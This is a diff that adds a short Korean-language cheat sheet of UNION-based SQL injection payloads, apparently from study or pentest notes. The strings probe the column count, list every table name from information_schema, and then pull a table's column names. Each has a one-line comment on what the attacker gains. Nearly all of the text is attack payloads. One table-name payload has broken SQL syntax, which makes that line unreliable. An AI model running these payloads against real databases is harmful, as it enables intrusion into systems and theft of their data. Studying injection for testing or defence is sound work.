@@ -1,0 +1,13 @@
+Payload
+--------------------------
+-> 컬럼 수를 확인하기 위해서 활용, 일반적인 결과와 다른 반응을 확인하여 컬럼 수 파악
+' UNION SELECT 1,2,3#
+...
+
+-> 공격자는 데이터베이스의 모든 테이블 이름을 확인할 수 있게 됨
+' UNION SELECT table_name,2,3 from information_schema.tables --
+' UNION 1,SELECT table_name,3 from information_schema.tables#
+...
+
+-> 공격자는 해당 테이블의 모든 열(컬럼) 정보(이름/명)를 얻을 수 있게 됨
+' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='[얻은 테이블 명]'#
